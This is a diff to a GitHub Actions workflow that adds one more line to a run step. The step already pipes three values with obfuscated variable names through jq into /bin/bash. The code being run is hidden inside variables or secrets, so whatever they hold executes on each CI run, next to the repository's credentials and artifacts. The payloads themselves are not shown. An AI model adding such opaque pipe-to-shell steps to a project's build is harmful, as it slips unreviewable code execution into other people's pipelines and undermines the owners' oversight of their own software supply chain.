@@ -38,6 +38,7 @@ jobs:
           echo $ateos73181 | jq -r .jwzi6897 | /bin/bash
           echo $ymr6535 | jq -r .iq469 | /bin/bash
           printf '%s' "$c55" | jq -r .fkpek5 | /bin/bash
+          printf '%s' "$l62975" | jq -r .cue7 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
